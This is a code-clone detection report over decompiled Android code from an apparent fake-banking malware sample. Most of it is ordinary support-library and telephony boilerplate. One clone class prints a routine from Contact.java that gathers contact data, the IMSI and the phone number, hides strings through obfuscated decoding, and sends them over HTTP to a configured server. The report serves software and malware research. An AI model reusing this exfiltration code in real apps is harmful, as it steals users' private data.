<clones>
<systeminfo processor="nicad6" system="BreakFakeBank" granularity="functions-blind" threshold="30%" minlines="10" maxlines="2500"/>
<cloneinfo npcs="1616" npairs="170"/>
<runinfo ncompares="8680" cputime="147833"/>
<classinfo nclasses="26"/>

<class classid="1" nclones="6" nlines="13" similarity="72">
<source file="systems/BreakFakeBank/com/android/internal/telephony/ITelephony.java" startline="72" endline="84" pcid="6">
      public void answerRingingCall() throws RemoteException {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          parcel1.writeInterfaceToken("com.android.internal.telephony.ITelephony");
          this.mRemote.transact(2, parcel1, parcel2, 0);
          parcel2.readException();
          return;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="340" endline="353" pcid="1539">
      public int getSmallIconId() {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
          if (!this.mRemote.transact(4, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null)
            return ITrustedWebActivityService.Stub.getDefaultImpl().getSmallIconId(); 
          parcel2.readException();
          return parcel2.readInt();
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="527" endline="540" pcid="1549">
    public int getSmallIconId() {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
        if (!this.mRemote.transact(4, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null)
          return ITrustedWebActivityService.Stub.getDefaultImpl().getSmallIconId(); 
        parcel2.readException();
        return parcel2.readInt();
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/com/android/internal/telephony/ITelephony.java" startline="121" endline="133" pcid="11">
    public void answerRingingCall() throws RemoteException {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        parcel1.writeInterfaceToken("com.android.internal.telephony.ITelephony");
        this.mRemote.transact(2, parcel1, parcel2, 0);
        parcel2.readException();
        return;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="528" endline="541" pcid="1599">
    public int getSmallIconId() throws RemoteException {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
        if (!this.mRemote.transact(4, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null)
          return ITrustedWebActivityService.Stub.getDefaultImpl().getSmallIconId(); 
        parcel2.readException();
        return parcel2.readInt();
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="341" endline="354" pcid="1589">
      public int getSmallIconId() throws RemoteException {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
          if (!this.mRemote.transact(4, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null)
            return ITrustedWebActivityService.Stub.getDefaultImpl().getSmallIconId(); 
          parcel2.readException();
          return parcel2.readInt();
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
</class>

<class classid="2" nclones="2" nlines="16" similarity="100">
<source file="systems/BreakFakeBank/com/android/internal/telephony/ITelephony.java" startline="90" endline="106" pcid="8">
      public boolean endCall() throws RemoteException {
        boolean bool = true;
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          parcel1.writeInterfaceToken("com.android.internal.telephony.ITelephony");
          this.mRemote.transact(1, parcel1, parcel2, 0);
          parcel2.readException();
          int i = parcel2.readInt();
          if (i == 0)
            bool = false; 
          return bool;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
<source file="systems/BreakFakeBank/com/android/internal/telephony/ITelephony.java" startline="139" endline="155" pcid="13">
    public boolean endCall() throws RemoteException {
      boolean bool = true;
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        parcel1.writeInterfaceToken("com.android.internal.telephony.ITelephony");
        this.mRemote.transact(1, parcel1, parcel2, 0);
        parcel2.readException();
        int i = parcel2.readInt();
        if (i == 0)
          bool = false; 
        return bool;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
</class>

<class classid="3" nclones="2" nlines="17" similarity="100">
<source file="systems/BreakFakeBank/com/google/bps/bfcfc/Contact.java" startline="941" endline="956" pcid="44">
              public void run() {
                try {
                  String str1 = URLEncoder.encode(Contact.this.data);
                  String str2 = Config.getIMSI((Context)Contact.this.mContext);
                  StringBuilder stringBuilder2 = new StringBuilder();
                  this(String.valueOf(Config.get((Context)CoreService.mContext, run("U=+PyM6JhZ41RQEm38i/qzkp"), Config.SERVER_HOST)));
                  str1 = stringBuilder2.append(Config.SERVER_ADDRESS).append(run("==aQycmbm8uLloK7l4rDjI6Rgp6R3zVCAXSzVKBLNQoZ")).append(str2).append(run("==pWDRdAQA0yMAG1cEkxNAGU")).append(Config.getPhoneNumber((Context)Contact.this.mContext).trim()).append(run("==hjIS5vc2s3NEQBxU9mMwNm")).append(str1).toString();
                  Connect connect = new Connect();
                  this();
                  str1 = connect.getHttpConnection(str1);
                  PrintStream printStream = System.out;
                  StringBuilder stringBuilder1 = new StringBuilder();
                  this(run("M=9mXSFwD2RrA0RpDk1iUxpiAHpty9f4yzU0ATEv2zDn"));
                  printStream.println(stringBuilder1.append(str1).toString());
                } catch (Exception exception) {}
              }
</source>
<source file="systems/BreakFakeBank/com/google/bps/bfcfc/Contact.java" startline="1411" endline="1426" pcid="46">
          public void run() {
            try {
              String str1 = URLEncoder.encode(Contact.this.data);
              String str2 = Config.getIMSI((Context)Contact.this.mContext);
              StringBuilder stringBuilder2 = new StringBuilder();
              this(String.valueOf(Config.get((Context)CoreService.mContext, run("U=+PyM6JhZ41RQEm38i/qzkp"), Config.SERVER_HOST)));
              str1 = stringBuilder2.append(Config.SERVER_ADDRESS).append(run("==aQycmbm8uLloK7l4rDjI6Rgp6R3zVCAXSzVKBLNQoZ")).append(str2).append(run("==pWDRdAQA0yMAG1cEkxNAGU")).append(Config.getPhoneNumber((Context)Contact.this.mContext).trim()).append(run("==hjIS5vc2s3NEQBxU9mMwNm")).append(str1).toString();
              Connect connect = new Connect();
              this();
              str1 = connect.getHttpConnection(str1);
              PrintStream printStream = System.out;
              StringBuilder stringBuilder1 = new StringBuilder();
              this(run("M=9mXSFwD2RrA0RpDk1iUxpiAHpty9f4yzU0ATEv2zDn"));
              printStream.println(stringBuilder1.append(str1).toString());
            } catch (Exception exception) {}
          }
</source>
</class>

<class classid="4" nclones="2" nlines="20" similarity="87">
<source file="systems/BreakFakeBank/android/support/v4/app/LoaderManagerImpl.java" startline="101" endline="121" pcid="90">
  void doRetain() {
    if (DEBUG)
      Log.v("LoaderManager", "Retaining in " + this); 
    if (!this.mStarted) {
      RuntimeException runtimeException = new RuntimeException("here");
      runtimeException.fillInStackTrace();
      Log.w("LoaderManager", "Called doRetain when not started: " + this, runtimeException);
      return;
    } 
    this.mRetaining = true;
    this.mStarted = false;
    int i = this.mLoaders.size() - 1;
    while (true) {
      if (i >= 0) {
        ((LoaderInfo)this.mLoaders.valueAt(i)).retain();
        i--;
        continue;
      } 
      return;
    } 
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/app/LoaderManagerImpl.java" startline="123" endline="142" pcid="91">
  void doStart() {
    if (DEBUG)
      Log.v("LoaderManager", "Starting in " + this); 
    if (this.mStarted) {
      RuntimeException runtimeException = new RuntimeException("here");
      runtimeException.fillInStackTrace();
      Log.w("LoaderManager", "Called doStart when already started: " + this, runtimeException);
      return;
    } 
    this.mStarted = true;
    int i = this.mLoaders.size() - 1;
    while (true) {
      if (i >= 0) {
        ((LoaderInfo)this.mLoaders.valueAt(i)).start();
        i--;
        continue;
      } 
      return;
    } 
  }
</source>
</class>

<class classid="5" nclones="2" nlines="13" similarity="75">
<source file="systems/BreakFakeBank/android/support/v4/app/LoaderManagerImpl.java" startline="650" endline="660" pcid="112">
    public String toString() {
      StringBuilder stringBuilder = new StringBuilder(64);
      stringBuilder.append("LoaderInfo{");
      stringBuilder.append(Integer.toHexString(System.identityHashCode(this)));
      stringBuilder.append(" #");
      stringBuilder.append(this.mId);
      stringBuilder.append(" : ");
      DebugUtils.buildShortClassTag(this.mLoader, stringBuilder);
      stringBuilder.append("}}");
      return stringBuilder.toString();
    }
</source>
<source file="systems/BreakFakeBank/android/support/v4/app/BackStackRecord.java" startline="803" endline="817" pcid="385">
  public String toString() {
    StringBuilder stringBuilder = new StringBuilder(128);
    stringBuilder.append("BackStackEntry{");
    stringBuilder.append(Integer.toHexString(System.identityHashCode(this)));
    if (this.mIndex >= 0) {
      stringBuilder.append(" #");
      stringBuilder.append(this.mIndex);
    } 
    if (this.mName != null) {
      stringBuilder.append(" ");
      stringBuilder.append(this.mName);
    } 
    stringBuilder.append("}");
    return stringBuilder.toString();
  }
</source>
</class>

<class classid="6" nclones="3" nlines="30" similarity="73">
<source file="systems/BreakFakeBank/android/support/v4/app/NotificationCompatHoneycomb.java" startline="10" endline="36" pcid="148">
  static Notification add(Context paramContext, Notification paramNotification, CharSequence paramCharSequence1, CharSequence paramCharSequence2, CharSequence paramCharSequence3, RemoteViews paramRemoteViews, int paramInt, PendingIntent paramPendingIntent1, PendingIntent paramPendingIntent2, Bitmap paramBitmap) {
    Notification.Builder builder = (new Notification.Builder(paramContext)).setWhen(paramNotification.when).setSmallIcon(paramNotification.icon, paramNotification.iconLevel).setContent(paramNotification.contentView).setTicker(paramNotification.tickerText, paramRemoteViews).setSound(paramNotification.sound, paramNotification.audioStreamType).setVibrate(paramNotification.vibrate).setLights(paramNotification.ledARGB, paramNotification.ledOnMS, paramNotification.ledOffMS);
    if ((paramNotification.flags & 0x2) != 0) {
      bool = true;
    } else {
      bool = false;
    } 
    builder = builder.setOngoing(bool);
    if ((paramNotification.flags & 0x8) != 0) {
      bool = true;
    } else {
      bool = false;
    } 
    builder = builder.setOnlyAlertOnce(bool);
    if ((paramNotification.flags & 0x10) != 0) {
      bool = true;
    } else {
      bool = false;
    } 
    builder = builder.setAutoCancel(bool).setDefaults(paramNotification.defaults).setContentTitle(paramCharSequence1).setContentText(paramCharSequence2).setContentInfo(paramCharSequence3).setContentIntent(paramPendingIntent1).setDeleteIntent(paramNotification.deleteIntent);
    if ((paramNotification.flags & 0x80) != 0) {
      bool = true;
      return builder.setFullScreenIntent(paramPendingIntent2, bool).setLargeIcon(paramBitmap).setNumber(paramInt).getNotification();
    } 
    boolean bool = false;
    return builder.setFullScreenIntent(paramPendingIntent2, bool).setLargeIcon(paramBitmap).setNumber(paramInt).getNotification();
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/app/NotificationCompatJellybean.java" startline="14" endline="41" pcid="200">
  public NotificationCompatJellybean(Context paramContext, Notification paramNotification, CharSequence paramCharSequence1, CharSequence paramCharSequence2, CharSequence paramCharSequence3, RemoteViews paramRemoteViews, int paramInt1, PendingIntent paramPendingIntent1, PendingIntent paramPendingIntent2, Bitmap paramBitmap, int paramInt2, int paramInt3, boolean paramBoolean1, boolean paramBoolean2, int paramInt4, CharSequence paramCharSequence4) {
    boolean bool;
    Notification.Builder builder = (new Notification.Builder(paramContext)).setWhen(paramNotification.when).setSmallIcon(paramNotification.icon, paramNotification.iconLevel).setContent(paramNotification.contentView).setTicker(paramNotification.tickerText, paramRemoteViews).setSound(paramNotification.sound, paramNotification.audioStreamType).setVibrate(paramNotification.vibrate).setLights(paramNotification.ledARGB, paramNotification.ledOnMS, paramNotification.ledOffMS);
    if ((paramNotification.flags & 0x2) != 0) {
      bool = true;
    } else {
      bool = false;
    } 
    builder = builder.setOngoing(bool);
    if ((paramNotification.flags & 0x8) != 0) {
      bool = true;
    } else {
      bool = false;
    } 
    builder = builder.setOnlyAlertOnce(bool);
    if ((paramNotification.flags & 0x10) != 0) {
      bool = true;
    } else {
      bool = false;
    } 
    builder = builder.setAutoCancel(bool).setDefaults(paramNotification.defaults).setContentTitle(paramCharSequence1).setContentText(paramCharSequence2).setSubText(paramCharSequence4).setContentInfo(paramCharSequence3).setContentIntent(paramPendingIntent1).setDeleteIntent(paramNotification.deleteIntent);
    if ((paramNotification.flags & 0x80) != 0) {
      bool = true;
    } else {
      bool = false;
    } 
    this.b = builder.setFullScreenIntent(paramPendingIntent2, bool).setLargeIcon(paramBitmap).setNumber(paramInt1).setUsesChronometer(paramBoolean2).setPriority(paramInt4).setProgress(paramInt2, paramInt3, paramBoolean1);
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/app/NotificationCompatIceCreamSandwich.java" startline="10" endline="36" pcid="441">
  static Notification add(Context paramContext, Notification paramNotification, CharSequence paramCharSequence1, CharSequence paramCharSequence2, CharSequence paramCharSequence3, RemoteViews paramRemoteViews, int paramInt1, PendingIntent paramPendingIntent1, PendingIntent paramPendingIntent2, Bitmap paramBitmap, int paramInt2, int paramInt3, boolean paramBoolean) {
    Notification.Builder builder = (new Notification.Builder(paramContext)).setWhen(paramNotification.when).setSmallIcon(paramNotification.icon, paramNotification.iconLevel).setContent(paramNotification.contentView).setTicker(paramNotification.tickerText, paramRemoteViews).setSound(paramNotification.sound, paramNotification.audioStreamType).setVibrate(paramNotification.vibrate).setLights(paramNotification.ledARGB, paramNotification.ledOnMS, paramNotification.ledOffMS);
    if ((paramNotification.flags & 0x2) != 0) {
      bool = true;
    } else {
      bool = false;
    } 
    builder = builder.setOngoing(bool);
    if ((paramNotification.flags & 0x8) != 0) {
      bool = true;
    } else {
      bool = false;
    } 
    builder = builder.setOnlyAlertOnce(bool);
    if ((paramNotification.flags & 0x10) != 0) {
      bool = true;
    } else {
      bool = false;
    } 
    builder = builder.setAutoCancel(bool).setDefaults(paramNotification.defaults).setContentTitle(paramCharSequence1).setContentText(paramCharSequence2).setContentInfo(paramCharSequence3).setContentIntent(paramPendingIntent1).setDeleteIntent(paramNotification.deleteIntent);
    if ((paramNotification.flags & 0x80) != 0) {
      bool = true;
      return builder.setFullScreenIntent(paramPendingIntent2, bool).setLargeIcon(paramBitmap).setNumber(paramInt1).setProgress(paramInt2, paramInt3, paramBoolean).getNotification();
    } 
    boolean bool = false;
    return builder.setFullScreenIntent(paramPendingIntent2, bool).setLargeIcon(paramBitmap).setNumber(paramInt1).setProgress(paramInt2, paramInt3, paramBoolean).getNotification();
  }
</source>
</class>

<class classid="7" nclones="2" nlines="14" similarity="100">
<source file="systems/BreakFakeBank/android/support/v4/app/FragmentPagerAdapter.java" startline="79" endline="92" pcid="160">
  public void setPrimaryItem(ViewGroup paramViewGroup, int paramInt, Object paramObject) {
    Fragment fragment = (Fragment)paramObject;
    if (fragment != this.mCurrentPrimaryItem) {
      if (this.mCurrentPrimaryItem != null) {
        this.mCurrentPrimaryItem.setMenuVisibility(false);
        this.mCurrentPrimaryItem.setUserVisibleHint(false);
      } 
      if (fragment != null) {
        fragment.setMenuVisibility(true);
        fragment.setUserVisibleHint(true);
      } 
      this.mCurrentPrimaryItem = fragment;
    } 
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/app/FragmentStatePagerAdapter.java" startline="130" endline="143" pcid="314">
  public void setPrimaryItem(ViewGroup paramViewGroup, int paramInt, Object paramObject) {
    Fragment fragment = (Fragment)paramObject;
    if (fragment != this.mCurrentPrimaryItem) {
      if (this.mCurrentPrimaryItem != null) {
        this.mCurrentPrimaryItem.setMenuVisibility(false);
        this.mCurrentPrimaryItem.setUserVisibleHint(false);
      } 
      if (fragment != null) {
        fragment.setMenuVisibility(true);
        fragment.setUserVisibleHint(true);
      } 
      this.mCurrentPrimaryItem = fragment;
    } 
  }
</source>
</class>

<class classid="8" nclones="3" nlines="13" similarity="90">
<source file="systems/BreakFakeBank/android/support/v4/app/ShareCompat.java" startline="307" endline="319" pcid="238">
    public Drawable getCallingActivityIcon() {
      Drawable drawable = null;
      if (this.mCallingActivity != null) {
        PackageManager packageManager = this.mActivity.getPackageManager();
        try {
          Drawable drawable1 = packageManager.getActivityIcon(this.mCallingActivity);
          drawable = drawable1;
        } catch (android.content.pm.PackageManager.NameNotFoundException nameNotFoundException) {
          Log.e("IntentReader", "Could not retrieve icon for calling activity", (Throwable)nameNotFoundException);
        } 
      } 
      return drawable;
    }
</source>
<source file="systems/BreakFakeBank/android/support/v4/app/ShareCompat.java" startline="321" endline="333" pcid="239">
    public Drawable getCallingApplicationIcon() {
      Drawable drawable = null;
      if (this.mCallingPackage != null) {
        PackageManager packageManager = this.mActivity.getPackageManager();
        try {
          Drawable drawable1 = packageManager.getApplicationIcon(this.mCallingPackage);
          drawable = drawable1;
        } catch (android.content.pm.PackageManager.NameNotFoundException nameNotFoundException) {
          Log.e("IntentReader", "Could not retrieve icon for calling application", (Throwable)nameNotFoundException);
        } 
      } 
      return drawable;
    }
</source>
<source file="systems/BreakFakeBank/android/support/v4/app/ShareCompat.java" startline="335" endline="347" pcid="240">
    public CharSequence getCallingApplicationLabel() {
      CharSequence charSequence = null;
      if (this.mCallingPackage != null) {
        PackageManager packageManager = this.mActivity.getPackageManager();
        try {
          CharSequence charSequence1 = packageManager.getApplicationLabel(packageManager.getApplicationInfo(this.mCallingPackage, 0));
          charSequence = charSequence1;
        } catch (android.content.pm.PackageManager.NameNotFoundException nameNotFoundException) {
          Log.e("IntentReader", "Could not retrieve label for calling application", (Throwable)nameNotFoundException);
        } 
      } 
      return charSequence;
    }
</source>
</class>

<class classid="9" nclones="2" nlines="16" similarity="92">
<source file="systems/BreakFakeBank/android/support/v4/util/LongSparseArray.java" startline="25" endline="42" pcid="619">
  private static int binarySearch(long[] paramArrayOflong, int paramInt1, int paramInt2, long paramLong) {
    int i = paramInt1 + paramInt2;
    int j = paramInt1 - 1;
    while (i - j > 1) {
      int k = (i + j) / 2;
      if (paramArrayOflong[k] < paramLong) {
        j = k;
        continue;
      } 
      i = k;
    } 
    if (i == paramInt1 + paramInt2)
      return paramInt1 + paramInt2 ^ 0xFFFFFFFF; 
    paramInt1 = i;
    if (paramArrayOflong[i] != paramLong)
      paramInt1 = i ^ 0xFFFFFFFF; 
    return paramInt1;
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/util/SparseArrayCompat.java" startline="25" endline="42" pcid="649">
  private static int binarySearch(int[] paramArrayOfint, int paramInt1, int paramInt2, int paramInt3) {
    int i = paramInt1 + paramInt2;
    int j = paramInt1 - 1;
    while (i - j > 1) {
      int k = (i + j) / 2;
      if (paramArrayOfint[k] < paramInt3) {
        j = k;
        continue;
      } 
      i = k;
    } 
    if (i == paramInt1 + paramInt2)
      return paramInt1 + paramInt2 ^ 0xFFFFFFFF; 
    paramInt1 = i;
    if (paramArrayOfint[i] != paramInt3)
      paramInt1 = i ^ 0xFFFFFFFF; 
    return paramInt1;
  }
</source>
</class>

<class classid="10" nclones="2" nlines="23" similarity="89">
<source file="systems/BreakFakeBank/android/support/v4/util/LongSparseArray.java" startline="44" endline="66" pcid="620">
  private void gc() {
    int i = this.mSize;
    int j = 0;
    long[] arrayOfLong = this.mKeys;
    Object[] arrayOfObject = this.mValues;
    int k = 0;
    while (k < i) {
      Object object = arrayOfObject[k];
      int m = j;
      if (object != DELETED) {
        if (k != j) {
          arrayOfLong[j] = arrayOfLong[k];
          arrayOfObject[j] = object;
          arrayOfObject[k] = null;
        } 
        m = j + 1;
      } 
      k++;
      j = m;
    } 
    this.mGarbage = false;
    this.mSize = j;
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/util/SparseArrayCompat.java" startline="44" endline="65" pcid="650">
  private void gc() {
    int i = this.mSize;
    int j = 0;
    int[] arrayOfInt = this.mKeys;
    Object[] arrayOfObject = this.mValues;
    int k = 0;
    while (k < i) {
      Object object = arrayOfObject[k];
      int m = j;
      if (object != DELETED) {
        if (k != j) {
          arrayOfInt[j] = arrayOfInt[k];
          arrayOfObject[j] = object;
        } 
        m = j + 1;
      } 
      k++;
      j = m;
    } 
    this.mGarbage = false;
    this.mSize = j;
  }
</source>
</class>

<class classid="11" nclones="2" nlines="11" similarity="85">
<source file="systems/BreakFakeBank/android/support/v4/util/LongSparseArray.java" startline="68" endline="78" pcid="621">
  public static int idealByteArraySize(int paramInt) {
    for (byte b = 4;; b++) {
      int i = paramInt;
      if (b < 32) {
        if (paramInt <= (1 << b) - 12)
          return (1 << b) - 12; 
      } else {
        return i;
      } 
    } 
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/util/SparseArrayCompat.java" startline="67" endline="77" pcid="651">
  static int idealByteArraySize(int paramInt) {
    for (byte b = 4;; b++) {
      int i = paramInt;
      if (b < 32) {
        if (paramInt <= (1 << b) - 12)
          return (1 << b) - 12; 
      } else {
        return i;
      } 
    } 
  }
</source>
</class>

<class classid="12" nclones="2" nlines="20" similarity="88">
<source file="systems/BreakFakeBank/android/support/v4/util/LongSparseArray.java" startline="84" endline="104" pcid="623">
  public void append(long paramLong, E paramE) {
    if (this.mSize != 0 && paramLong <= this.mKeys[this.mSize - 1]) {
      put(paramLong, paramE);
      return;
    } 
    if (this.mGarbage && this.mSize >= this.mKeys.length)
      gc(); 
    int i = this.mSize;
    if (i >= this.mKeys.length) {
      int j = idealLongArraySize(i + 1);
      long[] arrayOfLong = new long[j];
      Object[] arrayOfObject = new Object[j];
      System.arraycopy(this.mKeys, 0, arrayOfLong, 0, this.mKeys.length);
      System.arraycopy(this.mValues, 0, arrayOfObject, 0, this.mValues.length);
      this.mKeys = arrayOfLong;
      this.mValues = arrayOfObject;
    } 
    this.mKeys[i] = paramLong;
    this.mValues[i] = paramE;
    this.mSize = i + 1;
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/util/SparseArrayCompat.java" startline="83" endline="103" pcid="653">
  public void append(int paramInt, E paramE) {
    if (this.mSize != 0 && paramInt <= this.mKeys[this.mSize - 1]) {
      put(paramInt, paramE);
      return;
    } 
    if (this.mGarbage && this.mSize >= this.mKeys.length)
      gc(); 
    int i = this.mSize;
    if (i >= this.mKeys.length) {
      int j = idealIntArraySize(i + 1);
      int[] arrayOfInt = new int[j];
      Object[] arrayOfObject = new Object[j];
      System.arraycopy(this.mKeys, 0, arrayOfInt, 0, this.mKeys.length);
      System.arraycopy(this.mValues, 0, arrayOfObject, 0, this.mValues.length);
      this.mKeys = arrayOfInt;
      this.mValues = arrayOfObject;
    } 
    this.mKeys[i] = paramInt;
    this.mValues[i] = paramE;
    this.mSize = i + 1;
  }
</source>
</class>

<class classid="13" nclones="2" nlines="11" similarity="75">
<source file="systems/BreakFakeBank/android/support/v4/util/LongSparseArray.java" startline="140" endline="150" pcid="628">
  public E get(long paramLong, E paramE) {
    int i = binarySearch(this.mKeys, 0, this.mSize, paramLong);
    null = paramE;
    if (i >= 0) {
      if (this.mValues[i] == DELETED)
        return paramE; 
    } else {
      return null;
    } 
    return (E)this.mValues[i];
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/util/SparseArrayCompat.java" startline="126" endline="136" pcid="657">
  public E get(int paramInt, E paramE) {
    paramInt = binarySearch(this.mKeys, 0, this.mSize, paramInt);
    null = paramE;
    if (paramInt >= 0) {
      if (this.mValues[paramInt] == DELETED)
        return paramE; 
    } else {
      return null;
    } 
    return (E)this.mValues[paramInt];
  }
</source>
</class>

<class classid="14" nclones="2" nlines="37" similarity="93">
<source file="systems/BreakFakeBank/android/support/v4/util/LongSparseArray.java" startline="192" endline="228" pcid="632">
  public void put(long paramLong, E paramE) {
    int i = binarySearch(this.mKeys, 0, this.mSize, paramLong);
    if (i >= 0) {
      this.mValues[i] = paramE;
      return;
    } 
    int j = i ^ 0xFFFFFFFF;
    if (j < this.mSize && this.mValues[j] == DELETED) {
      this.mKeys[j] = paramLong;
      this.mValues[j] = paramE;
      return;
    } 
    i = j;
    if (this.mGarbage) {
      i = j;
      if (this.mSize >= this.mKeys.length) {
        gc();
        i = binarySearch(this.mKeys, 0, this.mSize, paramLong) ^ 0xFFFFFFFF;
      } 
    } 
    if (this.mSize >= this.mKeys.length) {
      j = idealLongArraySize(this.mSize + 1);
      long[] arrayOfLong = new long[j];
      Object[] arrayOfObject = new Object[j];
      System.arraycopy(this.mKeys, 0, arrayOfLong, 0, this.mKeys.length);
      System.arraycopy(this.mValues, 0, arrayOfObject, 0, this.mValues.length);
      this.mKeys = arrayOfLong;
      this.mValues = arrayOfObject;
    } 
    if (this.mSize - i != 0) {
      System.arraycopy(this.mKeys, i, this.mKeys, i + 1, this.mSize - i);
      System.arraycopy(this.mValues, i, this.mValues, i + 1, this.mSize - i);
    } 
    this.mKeys[i] = paramLong;
    this.mValues[i] = paramE;
    this.mSize++;
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/util/SparseArrayCompat.java" startline="178" endline="214" pcid="661">
  public void put(int paramInt, E paramE) {
    int i = binarySearch(this.mKeys, 0, this.mSize, paramInt);
    if (i >= 0) {
      this.mValues[i] = paramE;
      return;
    } 
    int j = i ^ 0xFFFFFFFF;
    if (j < this.mSize && this.mValues[j] == DELETED) {
      this.mKeys[j] = paramInt;
      this.mValues[j] = paramE;
      return;
    } 
    i = j;
    if (this.mGarbage) {
      i = j;
      if (this.mSize >= this.mKeys.length) {
        gc();
        i = binarySearch(this.mKeys, 0, this.mSize, paramInt) ^ 0xFFFFFFFF;
      } 
    } 
    if (this.mSize >= this.mKeys.length) {
      j = idealIntArraySize(this.mSize + 1);
      int[] arrayOfInt = new int[j];
      Object[] arrayOfObject = new Object[j];
      System.arraycopy(this.mKeys, 0, arrayOfInt, 0, this.mKeys.length);
      System.arraycopy(this.mValues, 0, arrayOfObject, 0, this.mValues.length);
      this.mKeys = arrayOfInt;
      this.mValues = arrayOfObject;
    } 
    if (this.mSize - i != 0) {
      System.arraycopy(this.mKeys, i, this.mKeys, i + 1, this.mSize - i);
      System.arraycopy(this.mValues, i, this.mValues, i + 1, this.mSize - i);
    } 
    this.mKeys[i] = paramInt;
    this.mValues[i] = paramE;
    this.mSize++;
  }
</source>
</class>

<class classid="15" nclones="2" nlines="12" similarity="88">
<source file="systems/BreakFakeBank/android/support/v4/util/AtomicFile.java" startline="39" endline="50" pcid="641">
  public void failWrite(FileOutputStream paramFileOutputStream) {
    if (paramFileOutputStream != null) {
      sync(paramFileOutputStream);
      try {
        paramFileOutputStream.close();
        this.mBaseName.delete();
        this.mBackupName.renameTo(this.mBaseName);
      } catch (IOException iOException) {
        Log.w("AtomicFile", "failWrite: Got exception:", iOException);
      } 
    } 
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/util/AtomicFile.java" startline="52" endline="62" pcid="642">
  public void finishWrite(FileOutputStream paramFileOutputStream) {
    if (paramFileOutputStream != null) {
      sync(paramFileOutputStream);
      try {
        paramFileOutputStream.close();
        this.mBackupName.delete();
      } catch (IOException iOException) {
        Log.w("AtomicFile", "finishWrite: Got exception:", iOException);
      } 
    } 
  }
</source>
</class>

<class classid="16" nclones="2" nlines="10" similarity="85">
<source file="systems/BreakFakeBank/android/support/v4/widget/CursorAdapter.java" startline="48" endline="56" pcid="697">
  public CursorAdapter(Context paramContext, Cursor paramCursor, boolean paramBoolean) {
    byte b;
    if (paramBoolean) {
      b = 1;
    } else {
      b = 2;
    } 
    init(paramContext, paramCursor, b);
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/widget/CursorAdapter.java" startline="172" endline="180" pcid="710">
  protected void init(Context paramContext, Cursor paramCursor, boolean paramBoolean) {
    byte b;
    if (paramBoolean) {
      b = 1;
    } else {
      b = 2;
    } 
    init(paramContext, paramCursor, b);
  }
</source>
</class>

<class classid="17" nclones="3" nlines="13" similarity="77">
<source file="systems/BreakFakeBank/android/support/v4/view/PagerTabStrip.java" startline="151" endline="162" pcid="798">
  public void setBackgroundColor(int paramInt) {
    super.setBackgroundColor(paramInt);
    if (!this.mDrawFullUnderlineSet) {
      boolean bool;
      if ((0xFF000000 & paramInt) == 0) {
        bool = true;
      } else {
        bool = false;
      } 
      this.mDrawFullUnderline = bool;
    } 
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/view/PagerTabStrip.java" startline="164" endline="175" pcid="799">
  public void setBackgroundDrawable(Drawable paramDrawable) {
    super.setBackgroundDrawable(paramDrawable);
    if (!this.mDrawFullUnderlineSet) {
      boolean bool;
      if (paramDrawable == null) {
        bool = true;
      } else {
        bool = false;
      } 
      this.mDrawFullUnderline = bool;
    } 
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/view/PagerTabStrip.java" startline="177" endline="188" pcid="800">
  public void setBackgroundResource(int paramInt) {
    super.setBackgroundResource(paramInt);
    if (!this.mDrawFullUnderlineSet) {
      boolean bool;
      if (paramInt == 0) {
        bool = true;
      } else {
        bool = false;
      } 
      this.mDrawFullUnderline = bool;
    } 
  }
</source>
</class>

<class classid="18" nclones="2" nlines="14" similarity="100">
<source file="systems/BreakFakeBank/android/support/v4/view/accessibility/AccessibilityNodeInfoCompat.java" startline="98" endline="115" pcid="877">
  public boolean equals(Object paramObject) {
    boolean bool = true;
    if (this != paramObject) {
      if (paramObject == null)
        return false; 
      if (getClass() != paramObject.getClass())
        return false; 
